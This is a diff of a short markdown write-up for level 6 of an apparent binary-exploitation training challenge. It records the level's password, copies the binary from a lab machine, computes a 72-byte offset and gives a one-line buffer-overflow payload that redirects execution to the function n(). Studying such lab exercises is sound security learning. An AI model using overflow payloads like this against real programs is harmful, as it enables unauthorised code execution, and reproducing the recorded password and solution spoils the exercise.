@@ -1,18 +1,19 @@
 # Level 6
 *password : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31*
 
+## Analyze
+
 ```
 $ scp -P 4242 level6@192.168.56.108:level6 binary/
 ```
 
-0x40 = 64
-
+0x40 = 64\
 `n()` address : 0x08048454
 
 ## Buffer overflow
 
-offset = 4 * 2 = 8
-64 + 8 = 72
+- execute `n()`
+- compute offset : 64 + 4 * 2 = 72
 
 ```
 $ ./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')
